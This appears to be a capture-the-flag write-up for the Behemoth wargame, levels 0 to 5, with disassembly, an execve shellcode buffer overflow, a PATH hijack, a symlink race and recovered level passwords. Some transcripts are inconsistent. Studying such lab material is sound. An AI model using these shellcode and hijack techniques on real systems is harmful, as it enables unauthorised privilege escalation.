## level0-level1

behemoth1: aesebootiv

objdump -d

```assembly
 main section:
 80485b8:c7 45 e4 4f 4b 5e 47 movl   $0x475e4b4f,-0x1c(%ebp)
 80485bf:c7 45 e8 53 59 42 45 movl   $0x45425953,-0x18(%ebp)
 80485c6:c7 45 ec 58 5e 59 00 movl   $0x595e58,-0x14(%ebp)
```

the string:

```
475e4b4f
45425953
595e58

4f 4b 5e 47 53 59 42 45 58 5e 59
```

use xor:

http://xor.pw/#

4f4b5e4753594245585e59 xor 2a2a2a2a2a2a2a2a2a2a2a = 6561746d7973686f727473



transfer hex to string:

http://string-functions.com/hex-string.aspx

eatmyshorts



find the passwd:

```
behemoth0@behemoth:/behemoth$ ./behemoth0

Password: eatmyshorts

Access granted..

$ whoami

behemoth1

$ cat /etc/behemoth_pass/behemoth1

aesebootiv
```

## level1-level2

**test the process** 

It shows we need to input a passwd word, so we tried to input something and got a "authentication failure"  

**take a look at the dissemble** 

```assembly
(gdb) disas main 

Dump of assembler code for function main: 
   0x0804844b <+0>: push   %ebp 
   0x0804844c <+1>: mov    %esp,%ebp 
   0x0804844e <+3>: sub    $0x44,%esp 
   0x08048451 <+6>: push   $0x8048500 
   0x08048456 <+11>: call   0x8048300 <printf@plt> 
   0x0804845b <+16>: add    $0x4,%esp 
   0x0804845e <+19>: lea    -0x43(%ebp),%eax 
   0x08048461 <+22>: push   %eax 
   0x08048462 <+23>: call   0x8048310 <gets@plt> 
   0x08048467 <+28>: add    $0x4,%esp 
   0x0804846a <+31>: push   $0x804850c 
   0x0804846f <+36>: call   0x8048320 <puts@plt> 
   0x08048474 <+41>: add    $0x4,%esp 
   0x08048477 <+44>: mov    $0x0,%eax 
   0x0804847c <+49>: leave 
   0x0804847d <+50>: ret 
End of assembler dump.
```

let us take a lool at the stack:

\-----------------------------

| return add 4 bytes | 

\---------------------------- 

| old esp 4 bytes	|       push   %ebp  

----------------------       mov    %esp,%ebp 

|                    			| 

|                  		  	|       0x43 

|               	  	   	| 

|     input     	     	| 

----------------------       sub    $0x44,%esp 

| call gets     	  	| 

\---------------------- 

So what is the size of the overwrite area??  

**try stack overflow** 

```shell
behemoth1@behemoth:/behemoth$ python -c "print 'A'*71" | ./behemoth1 
Password: Authentication failure. 
Sorry. 
Segmentation fault 
```

**find shellcode** 

 No we know that it must have some stack overflow, so we can find some shellcode to inject in somewhere of the system. And find the address of my shellcode just input into the return region of behemoth1 process. 

 ```shell
\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80 
 ```

From: http://shell-storm.org/shellcode/files/shellcode-606.php  

**insert our shellcode** 

 There are many ways to insert our shellcode into the system, just make sure the place you insert can be executed. Maybe the Environment, or just in the 0x43 regions. 

 

So I just export the shellcode as an environment named CODE: 

```shell
export CODE=$(python -c 'print "\x90"*100+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"') 
```

**find where your shellcode is** 

 For now, we have the shellcode in the environment, the address often fix at the time you login. But if you logout and login again, the value of the environment will change. 

 ```shell
(gdb) ./behemoth1 
(gdb) b *main+23 
(gdb) r 
You will stop at your breakpoint, now you can find the address of CODE environment 
(gdb) x/s *((char **)environ+offset) 
0xffffde5d:    "CODE=", '\220' <repeats 100 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀" 
 ```

So now, you have the address of your shellcode: 0xffffde5d. You just need to insert this address into the return address. 

**put your shellcode into the local region** 

 (gdb) r <<< $(python -c 'print "A"*71+"\x90"*100') 

Find the address you want ti insert into this stack:  

python -c "print 'A'\*71 + '\x64\xd6\xff\xff' + '\x90'\*16 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'"  > test 

(cat test; cat) | /behemoth/behemoth1 

**change the return address and run our shellcode!** 

behemoth1@behemoth:/behemoth$ python -c "print 'A'*71" | ./behemoth1 

Password: Authentication failure. 

Sorry. 

Segmentation fault 

whoami 

behemoth2 

cat /etc/behemoth_pass/behemoth2 

eimahquuof 

 



Congratulations! You got the passwd! 

 

*****************

There are something we need to know: 

1. The size of the input region in the stack we need to make sure. 
2. The shellcode must fit to our system, the path of bash, the 32-bit or 64-bit.







behemoth2: eimahquuof

## level2-level3

check the function calls of a program:

```shell
ltrace ./filename
```

look at the system calls:

```shell
strace ./filename
```

create a file named "touch"? and the touch file is a script to cat the passwd.

```
tmp$ mkdir /tmp/testa
tmp/testa$ touch test
```

```
#!/bin/bash
cat /etc/behemoth_pass/behemoth3
```

```
export PATH=/tmp/testa/:$PATH
```

```
$ /behemoth/behemoth2
nieteidiel
```

## level3-level4

blank



## level4-level5

behemoth4: ietheishei

trace the library to see what function the program uses:

```shell
behemoth4@behemoth:/behemoth$ ltrace ./behemoth4
__libc_start_main(0x804857b, 1, 0xffffd744, 0x8048640 <unfinished ...>
getpid()                                              = 1787
sprintf("/tmp/1787", "/tmp/%d", 1787)                 = 9
fopen("/tmp/1787", "r")                               = 0
puts("PID not found!"PID not found!
)                                = 15
+++ exited (status 0) +++
```

then dump the main assembly:

```assembly
(gdb) disas main
Dump of assembler code for function main:
   0x0804857b <+0>:	lea    0x4(%esp),%ecx
   0x0804857f <+4>:	and    $0xfffffff0,%esp
   0x08048582 <+7>:	pushl  -0x4(%ecx)
   0x08048585 <+10>:	push   %ebp
   0x08048586 <+11>:	mov    %esp,%ebp
   0x08048588 <+13>:	push   %ecx
   0x08048589 <+14>:	sub    $0x24,%esp
   0x0804858c <+17>:	call   0x8048400 <getpid@plt>
   0x08048591 <+22>:	mov    %eax,-0xc(%ebp)
   0x08048594 <+25>:	sub    $0x4,%esp
   0x08048597 <+28>:	pushl  -0xc(%ebp)
   0x0804859a <+31>:	push   $0x80486c0
   0x0804859f <+36>:	lea    -0x28(%ebp),%eax
   0x080485a2 <+39>:	push   %eax
   0x080485a3 <+40>:	call   0x8048460 <sprintf@plt>
   0x080485a8 <+45>:	add    $0x10,%esp
   0x080485ab <+48>:	sub    $0x8,%esp
   0x080485ae <+51>:	push   $0x80486c8
   0x080485b3 <+56>:	lea    -0x28(%ebp),%eax
   0x080485b6 <+59>:	push   %eax
   0x080485b7 <+60>:	call   0x8048430 <fopen@plt>
   0x080485bc <+65>:	add    $0x10,%esp
   0x080485bf <+68>:	mov    %eax,-0x10(%ebp)
   0x080485c2 <+71>:	cmpl   $0x0,-0x10(%ebp)
   0x080485c6 <+75>:	jne    0x80485da <main+95>
   0x080485c8 <+77>:	sub    $0xc,%esp
   0x080485cb <+80>:	push   $0x80486ca
   0x080485d0 <+85>:	call   0x8048410 <puts@plt>
   0x080485d5 <+90>:	add    $0x10,%esp
   0x080485d8 <+93>:	jmp    0x804862c <main+177>
   0x080485da <+95>:	sub    $0xc,%esp
   0x080485dd <+98>:	push   $0x1
   0x080485df <+100>:	call   0x80483f0 <sleep@plt>
   0x080485e4 <+105>:	add    $0x10,%esp
   0x080485e7 <+108>:	sub    $0xc,%esp
   0x080485ea <+111>:	push   $0x80486d9
   0x080485ef <+116>:	call   0x8048410 <puts@plt>
   0x080485f4 <+121>:	add    $0x10,%esp
   0x080485f7 <+124>:	jmp    0x8048607 <main+140>
   0x080485f9 <+126>:	sub    $0xc,%esp
   0x080485fc <+129>:	pushl  -0x14(%ebp)
   0x080485ff <+132>:	call   0x8048440 <putchar@plt>
   0x08048604 <+137>:	add    $0x10,%esp
   0x08048607 <+140>:	sub    $0xc,%esp
   0x0804860a <+143>:	pushl  -0x10(%ebp)
   0x0804860d <+146>:	call   0x8048450 <fgetc@plt>
   0x08048612 <+151>:	add    $0x10,%esp
   0x08048615 <+154>:	mov    %eax,-0x14(%ebp)
   0x08048618 <+157>:	cmpl   $0xffffffff,-0x14(%ebp)
   0x0804861c <+161>:	jne    0x80485f9 <main+126>
   0x0804861e <+163>:	sub    $0xc,%esp
   0x08048621 <+166>:	pushl  -0x10(%ebp)
   0x08048624 <+169>:	call   0x80483e0 <fclose@plt>
   0x08048629 <+174>:	add    $0x10,%esp
   0x0804862c <+177>:	mov    $0x0,%eax
   0x08048631 <+182>:	mov    -0x4(%ebp),%ecx
   0x08048634 <+185>:	leave
   0x08048635 <+186>:	lea    -0x4(%ecx),%esp
   0x08048638 <+189>:	ret
End of assembler dump.
```



from the assembly, we can find that the program is trying to read a file. So we can just link the file to the passed file, so we can read the passed

```shell
vi script

#! /bin/bash
/behemoth/behemoth4 &
my_pid=$!
kill -STOP $my_pid
ln -s /etc/behemoth_pass/behemoth5 /tmp/$my_pid
kill -CONT $my_pid
```

```shell
chmod +x script
./script

aizeeshing
```

## level5-level6

behemoth5: aizeeshing

```assembly
0804872b <main>:
 804872b:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 804872f:	83 e4 f0             	and    $0xfffffff0,%esp
 8048732:	ff 71 fc             	pushl  -0x4(%ecx)
 8048735:	55                   	push   %ebp
 8048736:	89 e5                	mov    %esp,%ebp
 8048738:	51                   	push   %ecx
 8048739:	83 ec 34             	sub    $0x34,%esp
 804873c:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
 8048743:	83 ec 08             	sub    $0x8,%esp
 8048746:	68 a0 89 04 08       	push   $0x80489a0
 804874b:	68 a2 89 04 08       	push   $0x80489a2
 8048750:	e8 5b fe ff ff       	call   80485b0 <fopen@plt>
 8048755:	83 c4 10             	add    $0x10,%esp
 8048758:	89 45 f0             	mov    %eax,-0x10(%ebp)
 804875b:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
 804875f:	75 1a                	jne    804877b <main+0x50>
 8048761:	83 ec 0c             	sub    $0xc,%esp
 8048764:	68 bf 89 04 08       	push   $0x80489bf
 8048769:	e8 e2 fd ff ff       	call   8048550 <perror@plt>
 804876e:	83 c4 10             	add    $0x10,%esp
 8048771:	83 ec 0c             	sub    $0xc,%esp
 8048774:	6a 01                	push   $0x1
 8048776:	e8 f5 fd ff ff       	call   8048570 <exit@plt>
 804877b:	83 ec 04             	sub    $0x4,%esp
 804877e:	6a 02                	push   $0x2
 8048780:	6a 00                	push   $0x0
 8048782:	ff 75 f0             	pushl  -0x10(%ebp)
 8048785:	e8 b6 fd ff ff       	call   8048540 <fseek@plt>
 804878a:	83 c4 10             	add    $0x10,%esp
 804878d:	83 ec 0c             	sub    $0xc,%esp
 8048790:	ff 75 f0             	pushl  -0x10(%ebp)
 8048793:	e8 08 fe ff ff       	call   80485a0 <ftell@plt>
 8048798:	83 c4 10             	add    $0x10,%esp
 804879b:	89 45 f4             	mov    %eax,-0xc(%ebp)
 804879e:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
 80487a2:	83 ec 0c             	sub    $0xc,%esp
 80487a5:	ff 75 f0             	pushl  -0x10(%ebp)
 80487a8:	e8 73 fd ff ff       	call   8048520 <rewind@plt>
 80487ad:	83 c4 10             	add    $0x10,%esp
 80487b0:	8b 45 f4             	mov    -0xc(%ebp),%eax
 80487b3:	83 ec 0c             	sub    $0xc,%esp
 80487b6:	50                   	push   %eax
 80487b7:	e8 a4 fd ff ff       	call   8048560 <malloc@plt>
 80487bc:	83 c4 10             	add    $0x10,%esp
 80487bf:	89 45 ec             	mov    %eax,-0x14(%ebp)
 80487c2:	83 ec 04             	sub    $0x4,%esp
 80487c5:	ff 75 f0             	pushl  -0x10(%ebp)
 80487c8:	ff 75 f4             	pushl  -0xc(%ebp)
 80487cb:	ff 75 ec             	pushl  -0x14(%ebp)
 80487ce:	e8 2d fd ff ff       	call   8048500 <fgets@plt>
 80487d3:	83 c4 10             	add    $0x10,%esp
 80487d6:	83 ec 0c             	sub    $0xc,%esp
 80487d9:	ff 75 ec             	pushl  -0x14(%ebp)
 80487dc:	e8 9f fd ff ff       	call   8048580 <strlen@plt>
 80487e1:	83 c4 10             	add    $0x10,%esp
 80487e4:	89 c2                	mov    %eax,%edx
 80487e6:	8b 45 ec             	mov    -0x14(%ebp),%eax
 80487e9:	01 d0                	add    %edx,%eax
 80487eb:	c6 00 00             	movb   $0x0,(%eax)
 80487ee:	83 ec 0c             	sub    $0xc,%esp
 80487f1:	ff 75 f0             	pushl  -0x10(%ebp)
 80487f4:	e8 17 fd ff ff       	call   8048510 <fclose@plt>
 80487f9:	83 c4 10             	add    $0x10,%esp
 80487fc:	83 ec 0c             	sub    $0xc,%esp
 80487ff:	68 c5 89 04 08       	push   $0x80489c5
 8048804:	e8 f7 fd ff ff       	call   8048600 <gethostbyname@plt>
 8048809:	83 c4 10             	add    $0x10,%esp
 804880c:	89 45 e8             	mov    %eax,-0x18(%ebp)
 804880f:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
 8048813:	75 1a                	jne    804882f <main+0x104>
 8048815:	83 ec 0c             	sub    $0xc,%esp
 8048818:	68 cf 89 04 08       	push   $0x80489cf
 804881d:	e8 2e fd ff ff       	call   8048550 <perror@plt>
 8048822:	83 c4 10             	add    $0x10,%esp
 8048825:	83 ec 0c             	sub    $0xc,%esp
 8048828:	6a 01                	push   $0x1
 804882a:	e8 41 fd ff ff       	call   8048570 <exit@plt>
 804882f:	83 ec 04             	sub    $0x4,%esp
 8048832:	6a 00                	push   $0x0
 8048834:	6a 02                	push   $0x2
 8048836:	6a 02                	push   $0x2
 8048838:	e8 b3 fd ff ff       	call   80485f0 <socket@plt>
 804883d:	83 c4 10             	add    $0x10,%esp
 8048840:	89 45 e4             	mov    %eax,-0x1c(%ebp)
 8048843:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
 8048847:	75 1a                	jne    8048863 <main+0x138>
 8048849:	83 ec 0c             	sub    $0xc,%esp
 804884c:	68 dd 89 04 08       	push   $0x80489dd
 8048851:	e8 fa fc ff ff       	call   8048550 <perror@plt>
 8048856:	83 c4 10             	add    $0x10,%esp
 8048859:	83 ec 0c             	sub    $0xc,%esp
 804885c:	6a 01                	push   $0x1
 804885e:	e8 0d fd ff ff       	call   8048570 <exit@plt>
 8048863:	66 c7 45 d0 02 00    	movw   $0x2,-0x30(%ebp)
 8048869:	83 ec 0c             	sub    $0xc,%esp
 804886c:	68 e4 89 04 08       	push   $0x80489e4
 8048871:	e8 6a fd ff ff       	call   80485e0 <atoi@plt>
 8048876:	83 c4 10             	add    $0x10,%esp
 8048879:	0f b7 c0             	movzwl %ax,%eax
 804887c:	83 ec 0c             	sub    $0xc,%esp
 804887f:	50                   	push   %eax
 8048880:	e8 ab fc ff ff       	call   8048530 <htons@plt>
 8048885:	83 c4 10             	add    $0x10,%esp
 8048888:	66 89 45 d2          	mov    %ax,-0x2e(%ebp)
 804888c:	8b 45 e8             	mov    -0x18(%ebp),%eax
 804888f:	8b 40 10             	mov    0x10(%eax),%eax
 8048892:	8b 00                	mov    (%eax),%eax
 8048894:	8b 00                	mov    (%eax),%eax
 8048896:	89 45 d4             	mov    %eax,-0x2c(%ebp)
 8048899:	83 ec 04             	sub    $0x4,%esp
 804889c:	6a 08                	push   $0x8
 804889e:	6a 00                	push   $0x0
 80488a0:	8d 45 d0             	lea    -0x30(%ebp),%eax
 80488a3:	83 c0 08             	add    $0x8,%eax
 80488a6:	50                   	push   %eax
 80488a7:	e8 14 fd ff ff       	call   80485c0 <memset@plt>
 80488ac:	83 c4 10             	add    $0x10,%esp
 80488af:	83 ec 0c             	sub    $0xc,%esp
 80488b2:	ff 75 ec             	pushl  -0x14(%ebp)
 80488b5:	e8 c6 fc ff ff       	call   8048580 <strlen@plt>
 80488ba:	83 c4 10             	add    $0x10,%esp
 80488bd:	89 c2                	mov    %eax,%edx
 80488bf:	83 ec 08             	sub    $0x8,%esp
 80488c2:	6a 10                	push   $0x10
 80488c4:	8d 45 d0             	lea    -0x30(%ebp),%eax
 80488c7:	50                   	push   %eax
 80488c8:	6a 00                	push   $0x0
 80488ca:	52                   	push   %edx
 80488cb:	ff 75 ec             	pushl  -0x14(%ebp)
 80488ce:	ff 75 e4             	pushl  -0x1c(%ebp)
 80488d1:	e8 fa fc ff ff       	call   80485d0 <sendto@plt>
 80488d6:	83 c4 20             	add    $0x20,%esp
 80488d9:	89 45 e0             	mov    %eax,-0x20(%ebp)
 80488dc:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
 80488e0:	75 1a                	jne    80488fc <main+0x1d1>
 80488e2:	83 ec 0c             	sub    $0xc,%esp
 80488e5:	68 e9 89 04 08       	push   $0x80489e9
 80488ea:	e8 61 fc ff ff       	call   8048550 <perror@plt>
 80488ef:	83 c4 10             	add    $0x10,%esp
 80488f2:	83 ec 0c             	sub    $0xc,%esp
 80488f5:	6a 01                	push   $0x1
 80488f7:	e8 74 fc ff ff       	call   8048570 <exit@plt>
 80488fc:	83 ec 0c             	sub    $0xc,%esp
 80488ff:	ff 75 e4             	pushl  -0x1c(%ebp)
 8048902:	e8 09 fd ff ff       	call   8048610 <close@plt>
 8048907:	83 c4 10             	add    $0x10,%esp
 804890a:	83 ec 0c             	sub    $0xc,%esp
 804890d:	6a 00                	push   $0x0
 804890f:	e8 5c fc ff ff       	call   8048570 <exit@plt>
 8048914:	66 90                	xchg   %ax,%ax
 8048916:	66 90                	xchg   %ax,%ax
 8048918:	66 90                	xchg   %ax,%ax
 804891a:	66 90                	xchg   %ax,%ax
 804891c:	66 90                	xchg   %ax,%ax
 804891e:	66 90                	xchg   %ax,%ax
```

```shell
behemoth5@behemoth:/behemoth$ ltrace ./behemoth5
__libc_start_main(0x804872b, 1, 0xffffd744, 0x8048920 <unfinished ...>
fopen("/etc/behemoth_pass/behemoth6", "r")            = 0
perror("fopen"fopen: Permission denied
)                                       = <void>
exit(1 <no return ...>
+++ exited (status 1) +++
```

use socket, send the passwd out to localhost port 1337 ump

use strings ./filename to get the port 1337

```shell
behemoth5@behemoth:/behemoth$ strings ./behemoth5
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
socket
exit
htons
fopen
perror
ftell
rewind
fgets
strlen
memset
fseek
fclose
malloc
gethostbyname
atoi
sendto
__libc_start_main
__gmon_start__
GLIBC_2.1
GLIBC_2.0
PTRh
QVh+
UWVS
t$,U
[^_]
/etc/behemoth_pass/behemoth6
fopen
localhost
gethostbyname
socket
1337
sendto
...
```

then we listen to the port, then run the ./behemoth5, we can get the passwd.

```shell
behemoth5@behemoth:/tmp/testc$ nc -l -u -p 1337
mayiroeche
```

use udp protocol to create the socket connection.

